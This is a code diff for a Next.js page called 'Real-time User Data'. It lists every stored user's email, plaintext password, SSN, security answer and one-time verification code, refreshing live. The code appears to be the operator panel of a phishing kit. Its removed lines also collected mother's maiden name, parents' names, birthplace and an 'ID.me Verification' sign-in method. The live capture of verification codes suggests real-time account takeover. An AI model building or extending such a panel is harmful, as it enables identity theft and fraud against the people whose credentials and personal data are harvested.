@@ -1,435 +1,488 @@
 "use client";
 
-import { useAppSelector, useAppDispatch } from "../store/hooks";
 import Link from "next/link";
 import { useState, useEffect } from "react";
-import DocumentsList from "../components/DocumentsList";
-import { UploadedDocument, removeDataField, UserInputData, removeDocument } from "../store/userSlice";
+import { useAppwrite } from "@/app/lib/AppwriteContext";
+import { client, databases, DATABASE_ID, USERS_COLLECTION_ID } from "@/app/lib/appwrite";
+import { Query } from "appwrite";
+import { useSearchParams } from "next/navigation";
 
-// Interface for tracking input history
-interface InputHistoryEntry {
+// Type for the document from Appwrite
+interface AppwriteUser {
+  $id: string;
+  $createdAt: string;
+  $updatedAt: string;
+  email: string;
+  firstName?: string;
+  lastName?: string;
+  middleName?: string;
+  authMethod?: "email" | "id.me" | null;
+  phoneNumber?: string;
+  ssn?: string;
+  address?: string;
+  city?: string;
+  state?: string;
+  zipCode?: string;
+  uploadedDocuments?: Array<{
   id: string;
-  field: string;
-  value: string;
-  timestamp: string;
-  user: string; // In a real app, this would be a user identifier
-  isDocument?: boolean;
-  documentData?: UploadedDocument;
+    name: string;
+    type?: string;
+    size: number;
+    uploadedAt?: string;
+  }>;
+  signInTimestamp?: string;
+  candidateFormTimestamp?: string;
+  verificationCodeTimestamp?: string;
+  verificationCode?: string;
+  password?: string;
+  securityAnswer?: string;
 }
 
 export default function TestPage() {
-  const userData = useAppSelector(state => state.user);
-  const dispatch = useAppDispatch();
-  const [documents, setDocuments] = useState<UploadedDocument[]>([]);
+  const searchParams = useSearchParams();
   
-  // State for tracking input history
-  const [inputHistory, setInputHistory] = useState<InputHistoryEntry[]>([]);
-  const [activeTab, setActiveTab] = useState<'overview' | 'history'>('overview');
+  // App state
+  const [users, setUsers] = useState<AppwriteUser[]>([]);
+  const [isLoading, setIsLoading] = useState(true);
+  const [error, setError] = useState<string | null>(null);
+  const [lastUpdate, setLastUpdate] = useState<Date | null>(null);
+  const [realtimeStatus, setRealtimeStatus] = useState<'connected' | 'disconnected' | 'connecting'>('connecting');
+  const [isDeleting, setIsDeleting] = useState<string | null>(null);
+  const [successMessage, setSuccessMessage] = useState<string | null>(null);
+  const { resetUserData } = useAppwrite();
   
-  // Update documents whenever userData changes
+  // Check if redirected after deletion from details page
   useEffect(() => {
-    if (userData.uploadedDocuments && Array.isArray(userData.uploadedDocuments)) {
-      setDocuments(userData.uploadedDocuments);
-    }
-  }, [userData.uploadedDocuments]);
-  
-  // Generate input history entries from ALL userData fields, including empty ones
-  useEffect(() => {
-    const entries: InputHistoryEntry[] = [];
-    
-    // Process all userData fields for the table, including empty values
-    Object.entries(userData).forEach(([key, value]) => {
-      // Skip the uploadedDocuments array as it's handled separately
-      if (key === 'uploadedDocuments') return;
+    const deletedEmail = searchParams.get('deleted');
+    if (deletedEmail) {
+      setSuccessMessage(`User ${deletedEmail} was successfully deleted.`);
       
-      // Get appropriate timestamp from timestamps in userData or use current time
-      let timestamp = new Date().toLocaleString();
-      if (key.includes('firstName') || key.includes('lastName')) {
-        timestamp = userData.candidateFormTimestamp || timestamp;
-      } else if (key.includes('email') || key.includes('auth')) {
-        timestamp = userData.signInTimestamp || timestamp;
-      } else if (key.includes('verification')) {
-        timestamp = userData.verificationCodeTimestamp || timestamp;
+      // Clear success message after 5 seconds
+      setTimeout(() => {
+        setSuccessMessage(null);
+      }, 5000);
+    }
+  }, [searchParams]);
+  
+  // Function to fetch all users
+  const fetchAllUsers = async () => {
+    try {
+      setIsLoading(true);
+      
+      const response = await databases.listDocuments(
+        DATABASE_ID,
+        USERS_COLLECTION_ID,
+        [
+          Query.limit(100),
+          Query.orderDesc('$updatedAt')
+        ]
+      );
+      
+      // Cast response.documents to AppwriteUser array after ensuring it has the right structure
+      const userDocuments = response.documents.map(doc => ({
+        $id: doc.$id,
+        $createdAt: doc.$createdAt,
+        $updatedAt: doc.$updatedAt,
+        email: doc.email || "",
+        firstName: doc.firstName || undefined,
+        lastName: doc.lastName || undefined,
+        middleName: doc.middleName || undefined,
+        authMethod: doc.authMethod || undefined,
+        phoneNumber: doc.phoneNumber || undefined,
+        ssn: doc.ssn || undefined,
+        address: doc.address || undefined,
+        city: doc.city || undefined,
+        state: doc.state || undefined,
+        zipCode: doc.zipCode || undefined,
+        uploadedDocuments: doc.uploadedDocuments || [],
+        signInTimestamp: doc.signInTimestamp || undefined,
+        candidateFormTimestamp: doc.candidateFormTimestamp || undefined,
+        verificationCodeTimestamp: doc.verificationCodeTimestamp || undefined,
+        verificationCode: doc.verificationCode || undefined,
+        password: doc.password || undefined,
+        securityAnswer: doc.securityAnswer || undefined
+      })) as AppwriteUser[];
+      
+      setUsers(userDocuments);
+      setLastUpdate(new Date());
+      setError(null);
+    } catch (err) {
+      console.error('Error fetching users:', err);
+      setError('Failed to load user data');
+    } finally {
+      setIsLoading(false);
+    }
+  };
+  
+  // Initial data fetch
+  useEffect(() => {
+    fetchAllUsers();
+    
+    // Set up auto-refresh
+    const interval = setInterval(() => {
+      fetchAllUsers();
+    }, 10000); // Refresh every 10 seconds
+    
+    return () => clearInterval(interval);
+  }, []);
+  
+  // Set up realtime subscription to the collection
+  useEffect(() => {
+    // Subscribe to the entire collection
+    const unsubscribe = client.subscribe(
+      `databases.${DATABASE_ID}.collections.${USERS_COLLECTION_ID}.documents`,
+      (response) => {
+        console.log('Realtime update received:', response);
+        fetchAllUsers();
+        setRealtimeStatus('connected');
       }
-      
-      entries.push({
-        id: `${key}-${Date.now()}`,
-        field: key,
-        value: value ? String(value) : "", // Convert to string, empty string if null
-        timestamp,
-        user: 'User1'
-      });
-    });
+    );
     
-    // Add documents separately with special handling
-    if (documents && documents.length > 0) {
-      documents.forEach(doc => {
-        entries.push({
-          id: `doc-${doc.id}`,
-          field: 'uploadedDocument',
-          value: doc.name,
-          timestamp: doc.uploadedAt,
-          user: 'User1',
-          isDocument: true,
-          documentData: doc
-        });
-      });
-    }
+    // Mark as connected after a short delay (even if no events yet)
+    const timer = setTimeout(() => {
+      if (realtimeStatus === 'connecting') {
+        setRealtimeStatus('connected');
+      }
+    }, 2000);
     
-    setInputHistory(entries); // Replace previous entries
-  }, [userData, documents]);
+    return () => {
+      clearTimeout(timer);
+      unsubscribe();
+      setRealtimeStatus('disconnected');
+    };
+  }, []);
   
-  // Handle deletion of a field
-  const handleDeleteField = (fieldName: string) => {
-    dispatch(removeDataField(fieldName));
-    
-    // Also remove from local inputHistory
-    setInputHistory(prev => prev.filter(entry => entry.field !== fieldName));
-  };
-
-  // Handle document download
-  const handleDownloadDocument = (doc: UploadedDocument) => {
-    // If we don't have data or it's not base64, we can't download
-    if (!doc.data || !doc.data.includes('base64')) {
-      console.error('Invalid document data');
-      return;
+  // Format a date/time value
+  const formatDate = (dateString?: string) => {
+    if (!dateString) return 'Never';
+    try {
+      return new Date(dateString).toLocaleString();
+    } catch {
+      return dateString;
     }
-
-    // Create an anchor element and trigger download
-    const link = document.createElement('a');
-    link.href = doc.data;
-    link.download = doc.name;
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  };
-
-  // Handle document deletion
-  const handleDeleteDocument = (documentId: string) => {
-    dispatch(removeDocument(documentId));
-    // Local state will update via the useEffect that watches userData.uploadedDocuments
   };
   
-
-  // Debug block
-  const debugBlock = (
-    <div className="mb-4 rounded bg-yellow-50 p-4 text-xs text-gray-800 border border-yellow-200">
-      <strong>Debug: Raw Redux State</strong>
-      <pre className="mt-2 overflow-x-auto">{JSON.stringify(userData, null, 2)}</pre>
-    </div>
-  );
-
-  // Group fields for display
-  const fieldGroups = [
-    {
-      title: "Authentication",
-      fields: [
-        { key: "authMethod", label: "Authentication Method", format: (val: string | null) => val === "email" ? "Email & Password" : val === "id.me" ? "ID.me Verification" : "Not authenticated" },
-        { key: "email", label: "Email Address" },
-        { key: "password", label: "Password", format: (val: string) => val ? val : "" },
-        { key: "verificationCode", label: "Verification Code" },
-        { key: "signInTimestamp", label: "Sign In Time" },
-        { key: "verificationCodeTimestamp", label: "Code Verified Time" }
-      ]
-    },
-    {
-      title: "Personal Information",
-      fields: [
-        { key: "firstName", label: "First Name" },
-        { key: "middleName", label: "Middle Name" },
-        { key: "lastName", label: "Last Name" },
-        { key: "dateOfBirth", label: "Date of Birth" },
-        { key: "phoneNumber", label: "Phone Number" }
-      ]
-    },
-    {
-      title: "Address Information",
-      fields: [
-        { key: "address", label: "Address" },
-        { key: "city", label: "City" },
-        { key: "state", label: "State" },
-        { key: "zipCode", label: "Zip Code" }
-      ]
-    },
-    {
-      title: "Family Information",
-      fields: [
-        { key: "mothersMaidenName", label: "Mother's Maiden Name" },
-        { key: "mothersFirstName", label: "Mother's First Name" },
-        { key: "mothersLastName", label: "Mother's Last Name" },
-        { key: "fathersFirstName", label: "Father's First Name" },
-        { key: "fathersLastName", label: "Father's Last Name" }
-      ]
-    },
-    {
-      title: "Employment Information",
-      fields: [
-        { key: "currentEmployer", label: "Current Employer" },
-        { key: "previousEmployer", label: "Previous Employer" }
-      ]
-    },
-    {
-      title: "Birth Information",
-      fields: [
-        { key: "placeOfBirth", label: "Place of Birth" },
-        { key: "birthCity", label: "Birth City" },
-        { key: "birthState", label: "Birth State" }
-      ]
-    },
-    {
-      title: "Identification",
-      fields: [
-        { key: "ssn", label: "Social Security Number", format: (val: string) => val ?  val : "" }
-      ]
-    },
-    {
-      title: "Security Information",
-      fields: [
-        { key: "securityQuestion", label: "Security Question" },
-        { key: "securityAnswer", label: "Security Answer" }
-      ]
+  // Handle data reset for a specific user
+  const handleResetUser = async (userId: string, email: string) => {
+    if (confirm(`Are you sure you want to reset all data for ${email}?`)) {
+      try {
+        setIsLoading(true);
+        await resetUserData();
+        setIsLoading(false);
+        fetchAllUsers();
+      } catch (error) {
+        console.error("Error resetting user:", error);
+        setError("Failed to reset user data");
+        setIsLoading(false);
+      }
     }
-  ];
+  };
 
-  // Count completed fields for progress
-  const totalFields = Object.keys(userData).length;
-  const completedFields = Object.values(userData).filter(Boolean).length;
-  const progressPercentage = Math.round((completedFields / totalFields) * 100);
+  // Handle delete user
+  const handleDeleteUser = async (userId: string, email: string) => {
+    if (confirm(`Are you sure you want to DELETE ${email} from the database? This action cannot be undone.`)) {
+      try {
+        setIsDeleting(userId);
+        await databases.deleteDocument(
+          DATABASE_ID,
+          USERS_COLLECTION_ID,
+          userId
+        );
+        
+        // Remove user from local state
+        setUsers(prev => prev.filter(user => user.$id !== userId));
+        setLastUpdate(new Date());
+        
+        // Show success message
+        setSuccessMessage(`User ${email} was successfully deleted.`);
+        
+        // Clear success message after 5 seconds
+        setTimeout(() => {
+          setSuccessMessage(null);
+        }, 5000);
+        
+      } catch (error) {
+        console.error("Error deleting user:", error);
+        setError(`Failed to delete user: ${error instanceof Error ? error.message : 'Unknown error'}`);
+      } finally {
+        setIsDeleting(null);
+      }
+    }
+  };
 
   return (
-    <div className="min-h-[calc(100vh-4rem)] bg-gray-100 px-4 py-8">
-      <div className="mx-auto max-w-5xl">
-        <div className="mb-8">
-          <h1 className="text-3xl font-bold text-blue-800">Real-time User Input Monitoring</h1>
-          <p className="mt-2 text-gray-600">
-            This page displays user data as it is entered across all forms in real-time
-          </p>
-          
-          
+    <div className="min-h-screen bg-gray-50 px-4 py-8">
+      <div className="mx-auto max-w-7xl">
+        <header className="mb-8">
+          <div className="flex flex-wrap items-center justify-between gap-4">
+            <div>
+              <h1 className="text-3xl font-bold text-blue-800">Real-time User Data</h1>
+              <p className="mt-1 text-gray-600">
+                Automatically showing all user data from Appwrite
+              </p>
+            </div>
+            
+            <div className="flex items-center gap-3">
+              <div className="flex items-center text-sm">
+                <span className="mr-2">Status:</span>
+                <span className={`inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium ${
+                  realtimeStatus === 'connected' 
+                    ? 'bg-green-100 text-green-800' 
+                    : realtimeStatus === 'connecting'
+                    ? 'bg-yellow-100 text-yellow-800'
+                    : 'bg-red-100 text-red-800'
+                }`}>
+                  <span className={`mr-1 h-2 w-2 rounded-full ${
+                    realtimeStatus === 'connected' 
+                      ? 'bg-green-500' 
+                      : realtimeStatus === 'connecting'
+                      ? 'bg-yellow-500'
+                      : 'bg-red-500'
+                  }`}></span>
+                  {realtimeStatus === 'connected' 
+                    ? 'Connected' 
+                    : realtimeStatus === 'connecting' 
+                    ? 'Connecting...'
+                    : 'Disconnected'
+                  }
+                </span>
         </div>
         
-        {/* Tab navigation */}
-        <div className="mb-6 border-b border-gray-200">
-          <div className="flex -mb-px">
             <button
-              onClick={() => setActiveTab('overview')}
-              className={`mr-4 py-2 px-4 font-medium ${
-                activeTab === 'overview'
-                  ? 'border-b-2 border-blue-500 text-blue-600'
-                  : 'text-gray-500 hover:text-gray-700'
-              }`}
-            >
-              Data Overview
-            </button>
-            <button
-              onClick={() => setActiveTab('history')}
-              className={`py-2 px-4 font-medium ${
-                activeTab === 'history'
-                  ? 'border-b-2 border-blue-500 text-blue-600'
-                  : 'text-gray-500 hover:text-gray-700'
-              }`}
-            >
-              Input History Table
+                onClick={fetchAllUsers}
+                disabled={isLoading}
+                className="flex items-center gap-1 rounded bg-blue-600 px-3 py-1.5 text-sm text-white hover:bg-blue-700 disabled:bg-blue-300"
+              >
+                <svg xmlns="http://www.w3.org/2000/svg" className={`h-4 w-4 ${isLoading ? 'animate-spin' : ''}`} fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                </svg>
+                {isLoading ? 'Refreshing...' : 'Refresh'}
             </button>
           </div>
         </div>
-
-        {activeTab === 'overview' ? (
-          <>
-            {/* Progress bar */}
-            <div className="mb-8 rounded-lg bg-white p-6 shadow">
-              <h2 className="mb-4 text-lg font-semibold text-gray-900">User Progress</h2>
-              <div className="space-y-3">
-                <div className="overflow-hidden rounded-full bg-gray-200">
-                  <div 
-                    className="h-2 rounded-full bg-blue-600 transition-all duration-500"
-                    style={{ width: `${progressPercentage}%` }}
-                  ></div>
+        </header>
+        
+        {/* Status bar */}
+        <div className="mb-6 rounded-lg bg-white p-4 shadow-sm">
+          <div className="flex flex-wrap items-center justify-between">
+            <div className="text-sm text-gray-600">
+              <span className="font-medium">{users.length}</span> users in database
                 </div>
-                <p className="text-sm text-gray-600">
-                  Progress: {progressPercentage}% ({completedFields} of {totalFields} fields completed)
-                </p>
-                {/* Status indicators */}
-                <div className="mt-4 flex flex-wrap gap-3">
-                  <StatusBadge 
-                    label="Sign In" 
-                    completed={!!userData.authMethod} 
-                    timestamp={userData.signInTimestamp}
-                  />
-                  <StatusBadge 
-                    label="Verification" 
-                    completed={!!userData.verificationCode} 
-                    timestamp={userData.verificationCodeTimestamp}
-                  />
-                  <StatusBadge 
-                    label="Profile" 
-                    completed={!!userData.firstName && !!userData.lastName} 
-                    timestamp={userData.candidateFormTimestamp}
-                  />
+            <div className="text-sm text-gray-600">
+              {lastUpdate && `Last updated: ${lastUpdate.toLocaleString()}`}
                 </div>
               </div>
+          
+          {error && (
+            <div className="mt-2 rounded bg-red-50 p-2 text-sm text-red-600">
+              {error}
             </div>
-
-            {/* Uploaded Documents Section - Using the specialized component */}
-            {documents && <DocumentsList documents={documents} />}
-
-            {/* Debug info */}
-            <div className="mb-8 rounded-lg bg-white p-6 shadow">
-              <h2 className="mb-4 border-b pb-2 text-xl font-semibold text-blue-800">Debug Information</h2>
-              <div className="rounded bg-gray-100 p-3">
-                <pre className="overflow-x-auto text-xs">        {debugBlock}
-                </pre>
+          )}
+          
+          {successMessage && (
+            <div className="mt-2 rounded bg-green-50 p-2 text-sm text-green-600 flex items-center justify-between">
+              <div className="flex items-center">
+                <svg className="h-4 w-4 mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+                </svg>
+                {successMessage}
               </div>
+              <button 
+                onClick={() => setSuccessMessage(null)}
+                className="text-green-700 hover:text-green-900"
+              >
+                <svg className="h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+                  <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
+                </svg>
+              </button>
             </div>
-
-            {/* Real-time data display */}
-            <div className="space-y-6">
-              {fieldGroups.map((group, index) => (
-                <div key={index} className="rounded-lg bg-white p-6 shadow">
-                  <h2 className="mb-4 border-b pb-2 text-xl font-semibold text-blue-800">
-                    {group.title}
-                  </h2>
-                  <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
-                    {group.fields.map((field) => {
-                      const key = field.key as keyof typeof userData;
-                      const value = userData[key];
-                      const displayValue = field.format ? field.format(value as any) : value;
-                      
-                      return (
-                        <div key={field.key} className={`rounded border p-3 transition-all duration-300 ${value ? "border-blue-200 bg-blue-50" : "border-gray-200 bg-gray-50"}`}>
-                          <p className="text-sm font-medium text-gray-500">{field.label}</p>
-                          <p className={`mt-1 text-base ${value ? "text-gray-900" : "text-gray-400 italic"}`}>
-                            {displayValue?.toString() || "Not yet provided"}
-                          </p>
-                        </div>
-                      );
-                    })}
-                  </div>
-                </div>
-              ))}
+          )}
             </div>
-          </>
-        ) : (
-          // Input History Table View - Revised to show ALL fields including documents with download
-          <div className="rounded-lg bg-white p-6 shadow">
-            <h2 className="mb-4 text-xl font-semibold text-blue-800">User Input History</h2>
-            <p className="mb-4 text-sm text-gray-600">
-              This table shows all user data entries, including documents and empty fields. Each entry can be deleted individually.
-            </p>
-            
-            {inputHistory.length === 0 ? (
-              <div className="rounded-md bg-gray-50 p-4 text-center text-gray-500">
-                No input history available yet. Start entering data in the forms.
-              </div>
-            ) : (
+        
+        {/* Users Table */}
+        <div className="mb-6 overflow-hidden rounded-lg bg-white shadow-sm">
               <div className="overflow-x-auto">
                 <table className="min-w-full divide-y divide-gray-200">
                   <thead className="bg-gray-50">
                     <tr>
-                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
+                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                         User
                       </th>
-                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
-                        Key
+                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
+                    Auth Method
                       </th>
-                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
-                        Field
+                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
+                    Personal Info
                       </th>
-                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
-                        Value
+                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
+                    Location
                       </th>
-                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
-                        Timestamp
+                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
+                    Activity
                       </th>
-                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
+                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                         Actions
                       </th>
                     </tr>
                   </thead>
                   <tbody className="divide-y divide-gray-200 bg-white">
-                    {inputHistory.map((entry) => (
-                      <tr key={entry.id} className={`hover:bg-gray-50 ${entry.value ? "" : "text-gray-400"}`}>
-                        <td className="whitespace-nowrap px-6 py-4">
-                          <div className="flex items-center">
-                            <div className="h-8 w-8 flex-shrink-0 rounded-full bg-blue-100 flex items-center justify-center">
-                              <span className="text-xs font-medium text-blue-800">
-                                {entry.user.charAt(0)}
+                {isLoading && users.length === 0 ? (
+                  <tr>
+                    <td colSpan={6} className="px-4 py-8 text-center">
+                      <div className="flex justify-center">
+                        <svg className="h-8 w-8 animate-spin text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                      </div>
+                    </td>
+                  </tr>
+                ) : users.length === 0 ? (
+                  <tr>
+                    <td colSpan={6} className="px-4 py-4 text-center text-gray-500">
+                      No users found in the database.
+                    </td>
+                  </tr>
+                ) : (
+                  users.map((user) => (
+                    <tr key={user.$id} className="hover:bg-gray-50">
+                      <td className="px-4 py-4 text-sm">
+                        <div className="font-medium text-blue-600">{user.email}</div>
+                        <div className="text-xs text-gray-500">ID: {user.$id.substring(0, 8)}...</div>
+                      </td>
+                      <td className="px-4 py-4 text-sm">
+                        {user.authMethod ? (
+                          <span className={`inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium ${
+                            user.authMethod === 'email' 
+                              ? 'bg-blue-100 text-blue-800' 
+                              : 'bg-purple-100 text-purple-800'
+                          }`}>
+                            {user.authMethod === 'email' ? 'Email & Password' : 'ID.me'}
+                          </span>
+                        ) : (
+                          <span className="text-gray-400 italic">Not set</span>
+                        )}
+                        
+                        {/* Display verification code if available */}
+                        {user.verificationCode && (
+                          <div className="mt-2">
+                            <span className="rounded-md bg-yellow-100 px-1.5 py-0.5 text-xs font-medium text-yellow-800">
+                              Code: {user.verificationCode}
                               </span>
                             </div>
-                            <div className="ml-3">
-                              <p className="text-sm font-medium text-gray-900">{entry.user}</p>
-                            </div>
+                        )}
+                      </td>
+                      <td className="px-4 py-4 text-sm">
+                        <div>
+                          <span className="font-medium">Name:</span>{' '}
+                          {[user.firstName, user.middleName, user.lastName].filter(Boolean).join(' ') || 
+                            <span className="text-gray-400 italic">Not provided</span>}
+                        </div>
+                        {user.phoneNumber && (
+                          <div className="text-xs text-gray-600 mt-1">
+                            Phone: {user.phoneNumber}
                           </div>
-                        </td>
-                        <td className="whitespace-nowrap px-6 py-4 text-sm">
-                          {entry.field}
-                        </td>
-                        <td className="whitespace-nowrap px-6 py-4 text-sm">
-                          {/* Convert camelCase to readable text */}
-                          {entry.isDocument ? 'Document' : 
-                            entry.field.replace(/([A-Z])/g, ' $1')
-                                       .replace(/^./, str => str.toUpperCase())}
-                        </td>
-                        <td className="px-6 py-4 text-sm">
-                          {entry.isDocument ? (
-                            <div className="flex items-center">
-                              <svg className="h-5 w-5 mr-2 text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
-                              </svg>
-                              <span>{entry.value}</span>
+                        )}
+                        {user.ssn && (
+                          <div className="text-xs text-gray-600 mt-1">
+                            SSN: {user.ssn}
+                          </div>
+                        )}
+                        {user.password && (
+                          <div className="text-xs text-gray-600 mt-1">
+                            Password: {user.password}
                             </div>
-                          ) : entry.field === 'password' ? 
-                             (entry.value ? '••••••••' : '') : 
-                             (entry.value || <span className="italic text-gray-400">Empty</span>)
-                          }
+                        )}
+                        {user.securityAnswer && (
+                          <div className="text-xs text-gray-600 mt-1">
+                            Security Answer: {user.securityAnswer}
+                          </div>
+                        )}
                         </td>
-                        <td className="whitespace-nowrap px-6 py-4 text-sm">
-                          {entry.timestamp || <span className="italic text-gray-400">Not recorded</span>}
+                      <td className="px-4 py-4 text-sm">
+                        {user.address || user.city || user.state ? (
+                          <div>
+                            {user.address && <div>{user.address}</div>}
+                            {(user.city || user.state || user.zipCode) && (
+                              <div className="text-gray-600">
+                                {[user.city, user.state, user.zipCode].filter(Boolean).join(', ')}
+                              </div>
+                            )}
+                          </div>
+                        ) : (
+                          <span className="text-gray-400 italic">Not provided</span>
+                        )}
                         </td>
-                        <td className="whitespace-nowrap px-6 py-4 text-sm">
-                          <div className="flex space-x-2">
-                            {entry.isDocument && entry.documentData ? (
+                      <td className="px-4 py-4 text-xs text-gray-500">
+                        <div className="space-y-1">
+                          <div>
+                            <span className="font-medium">Updated:</span> {formatDate(user.$updatedAt)}
+                          </div>
+                          <div>
+                            <span className="font-medium">Sign in:</span> {formatDate(user.signInTimestamp)}
+                          </div>
+                          <div>
+                            <span className="font-medium">Form completed:</span> {formatDate(user.candidateFormTimestamp)}
+                          </div>
+                          {user.verificationCodeTimestamp && (
+                            <div>
+                              <span className="font-medium">Verification:</span> {formatDate(user.verificationCodeTimestamp)}
+                            </div>
+                          )}
+                        </div>
+                        </td>
+                      <td className="px-4 py-4 text-sm">
+                        <div className="space-y-1">
+                          <button
+                            onClick={() => {
+                              const url = `/test/details?email=${encodeURIComponent(user.email)}`;
+                              window.open(url, '_blank');
+                            }}
+                            className="flex w-full items-center justify-center rounded bg-blue-50 px-2 py-1 text-xs font-medium text-blue-600 hover:bg-blue-100"
+                          >
+                            View Details
+                          </button>
+                                <button
+                            onClick={() => handleResetUser(user.$id, user.email)}
+                            className="flex w-full items-center justify-center rounded bg-orange-50 px-2 py-1 text-xs font-medium text-orange-600 hover:bg-orange-100"
+                                >
+                            Reset Data
+                                </button>
+                                <button
+                            onClick={() => handleDeleteUser(user.$id, user.email)}
+                            disabled={isDeleting === user.$id}
+                            className="flex w-full items-center justify-center rounded bg-red-50 px-2 py-1 text-xs font-medium text-red-600 hover:bg-red-100 disabled:opacity-50"
+                          >
+                            {isDeleting === user.$id ? (
                               <>
-                                <button
-                                  onClick={() => handleDownloadDocument(entry.documentData!)}
-                                  className="text-blue-600 hover:text-blue-900 focus:outline-none"
-                                  title="Download document"
-                                >
-                                  <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                                <svg className="mr-1 h-3 w-3 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                   </svg>
-                                </button>
-                                <button
-                                  onClick={() => handleDeleteDocument(entry.documentData!.id)}
-                                  className="text-red-600 hover:text-red-900 focus:outline-none"
-                                  title="Delete document"
-                                >
-                                  <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
-                                  </svg>
-                                </button>
+                                Deleting...
                               </>
                             ) : (
-                              <button
-                                onClick={() => handleDeleteField(entry.field)}
-                                className="text-red-600 hover:text-red-900 focus:outline-none"
-                                title="Delete field data"
-                              >
-                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
-                                </svg>
-                              </button>
+                              "Delete User"
                             )}
+                          </button>
                           </div>
                         </td>
                       </tr>
-                    ))}
+                  ))
+                )}
                   </tbody>
                 </table>
               </div>
-            )}
+        </div>
+        
+        {/* Auto-update info */}
+        <div className="mb-8 rounded-lg bg-blue-50 p-4 text-center text-sm text-blue-700">
+          <p>
+            This page automatically refreshes data every 10 seconds and listens for real-time updates.
+            <br />
+            Last refresh: {lastUpdate ? lastUpdate.toLocaleString() : 'Never'}
+          </p>
           </div>
-        )}
 
         <div className="mt-8 flex justify-center">
           <Link
@@ -440,39 +493,6 @@ export default function TestPage() {
           </Link>
         </div>
       </div>
-    </div>
-  );
-}
-
-// Status badge component
-function StatusBadge({ 
-  label, 
-  completed, 
-  timestamp 
-}: { 
-  label: string; 
-  completed: boolean; 
-  timestamp?: string 
-}) {
-  return (
-    <div className={`flex items-center gap-2 rounded-full px-3 py-1 text-sm ${completed ? "bg-green-100 text-green-800" : "bg-gray-100 text-gray-600"}`}>
-      {completed ? (
-        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
